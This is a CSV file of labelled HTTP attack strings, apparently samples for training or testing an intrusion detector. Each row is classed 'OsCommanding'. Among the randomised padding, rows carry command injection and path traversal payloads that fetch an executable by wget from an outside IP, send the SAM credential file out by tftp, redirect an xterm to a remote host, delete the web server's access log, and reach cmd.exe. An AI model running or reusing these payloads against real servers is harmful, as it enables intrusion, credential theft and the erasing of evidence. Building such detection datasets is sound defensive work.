id,class,vector
1,OsCommanding,/dcNF_symcnzynma/en46/tQrU2n/o10jR86coK.sDGjMe3/twctuzHOmUxDc83tZ/tnecipd8ui07mi/zd7sivKoaoupeCwcwoT/utqeeanwt6/rW6AxaZ_QzojMfF/Gb.jpeg?b7jere8IrzeN=00&eaRyeOsrl=hhtaccesi%3Ai+3srS3tr&asiens1xsbu3G=w%40ibh%3Dswt&xrasitjusr=Tm+o&wigni0ah=%5Crxterm+-display++213.152.153.76%3A0.0
14,OsCommanding,/cgi-bin/../../../../../../../WINNT/system32/ping.exe
15,OsCommanding,..%5c../..%5c../..%5c/..�
25,OsCommanding,OgI0dMG-nullTt=n4OE2FsyY&jmskaaosb0=xDiAc&GenxmanltaiapN6=48610455&av5iewtharRpLa=rcoridhirttttatE&ate27uans=352373&3nIelpmr5bszebn=54233314&0qyshgEthnxb=182963881&gLcZi5gX0mp=vgoamssidetyTh
29,OsCommanding,/scripts/..��../winnt/system32/cmd.exe?/c+dir
31,OsCommanding,bhicg9=3355721&ietre1nwrnes=e6passthrus&nGSK-yN=eIs&ed0diodoanu=487502087&kK6binedLzf=mail nkiO2@calsimIh.falqb.gov <<   /tmp/wu.c     ;&2ntlEqIdjn=scriptsr'x3eC
37,OsCommanding,/Enec/rn/tZ8ImEMM0CR_9kj0Q/hi2elTuusopsna/rtrorinocidpsut/iJFcX5HAm70kedh@/Ca/ZUktek3B/tkU3.tiff?1X3DSv=reTe7&LTeoOeQlndNos=%5Cn+wget+++++http%3A%2F%2F34.84.3.186%3A24327%2Fnftp.exe
38,OsCommanding,..%%35c../winnt/system32/cmd.exe?
41,OsCommanding,/dADkGWks-nKs0k.Ii4m/og8b-wLlPa/mDGSkxCDPHD5/X8450_.mspx?lrsl1pioO=nmhco4n%7CwspclsgtkAD&ioseiaUwu9z=155.72.58.99%7Ctftp++-i++231.118.87.72+++++PUT+sam._&erlOi5unrtteo2E=1518&MA40w8B.PMv=eeaniebncsd0None&rtae4hiat7suei=eh2tw%2BhsS%3Fqz&uhntaon7=tA+ribnptgpl0dveyo
42,OsCommanding,"/scripts/file.bat"""
60,OsCommanding,/fK4aMuja0otj1D1B9h/atOhecte/jiesloeidMnpnti6ynD/iX9htol-V0d91HTaG/9hi2WL9k6dhU_U/ntmpJSMni3YRCm/le27e6wteyFhfmeEn/K1cmdRfromprocessing-instructionl9.htm?QwnYY6=ioMshri&hmnsr=cgliue&earrsue8=dFGNSfp&iu=57&vut=mmbMk&1Dtdnph1kihE4s=lapositionfgqonnullkStw&mistpa=03856764&maosehYig9lcl1N=rno%25e&nhw5t7eeLinfetn=936&8t3qtd=rcf%7Ct+tt&lti5Usaonise=cTee%3Dt1eheaouhtacces
61,OsCommanding,/al3vglsh2w8n/aDgtGxCLbZmHu.N50/CbLlpassthruR.asp?ygtsg8nnewar8=22&Vt=la&qXZK0_eYRn94=%2Fohw&fejBru1P.za=53176519&ean=1ga%40f&wfra5cofeEntsi=%250arm++-f+++%2Fvar%2Flog%2Fhttpd%2Faccess_log%3B&BomycIt2otw=ea
74,OsCommanding,/cgi-local/alibaba.pl|dir
76,OsCommanding,/scripts/georgi.asp/..��..��..��file.ext?
